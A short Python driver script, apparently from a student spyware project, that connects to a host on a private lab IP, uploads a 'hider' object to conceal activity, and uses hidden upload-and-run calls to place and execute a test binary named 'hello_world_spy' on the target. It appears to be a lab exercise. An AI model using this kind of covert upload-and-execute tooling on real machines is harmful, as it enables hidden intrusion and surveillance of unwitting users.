from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode

HOST = "192.168.83.130"
PORT = 65432


def main():
    agent = Agent(HOST, PORT)
    targetHiderPath = "sendHiderTest.o"
    print(
        agent.write_file(
            "/home/avner/Arazim-Projects-2024---spyware/hider",
            targetHiderPath,
        )
    )
    print(agent.hider_setup(targetHiderPath))
    print(
        agent.hidden_action_with_upload(
            FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
            "/home/avner/Arazim-Projects-2024---spyware/src/ServerSpy/compiledAtHome.o",
            "hello_world_spy",
        )
    )


if __name__ == "__main__":
    main()
